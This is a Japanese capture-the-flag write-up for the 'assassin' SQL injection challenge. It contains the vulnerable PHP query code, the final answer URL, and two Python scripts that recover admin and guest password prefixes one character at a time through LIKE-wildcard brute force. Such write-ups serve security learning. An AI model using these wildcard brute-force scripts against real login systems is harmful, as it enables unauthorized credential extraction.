# assasin

## answer

```
https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=832e%
```

## problem

```
query : select id from prob_assassin where pw like ''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```

## memo

```https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=1```とかで試してみる。

```query : select id from prob_assassin where pw like '1'```となった。

コードを読んでいく。

曖昧検索をしているので、

```
?pw=%1%
```

とかしたら、

```
Hello guest
```

になる。

これを利用してadminのパスワードを出す。

コードを書いてみた。

```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%#&()"
    password = ""
    for count in range(1, 15):
        for char in chars:
            tmp_char = password + char
            val = '{password}%'.format(password = tmp_char)
            print(val)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello guest") == 1:
                password += char
                break
            if char == 'Z':
                print("not found")
                print(password)
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
```

上記のexploitでguestのパスワードが出る。

このあと、adminのパスワードを出したい。

```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%#&()"
    password = ""
    for count in range(1, 15):
        for char in chars:
            tmp_char = password + char
            val = '{password}%'.format(password = tmp_char)
            print(val)
            params = {'pw': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                break
            elif response.text.count("Hello guest") == 1:
                password += char
                break
            if char == 'Z':
                print("not found")
                print(password)
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
```

上記のexploitでは、832edd10とでるが、これでは認証が通らない。

パスワードの文字列が気になる...これを本気で取りに行くこともできるかもしれないが、

guest用のパスワードと見比べればFLAGを出すことが可能である。

```
?pw=832e%
```

こんなのでいい。

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)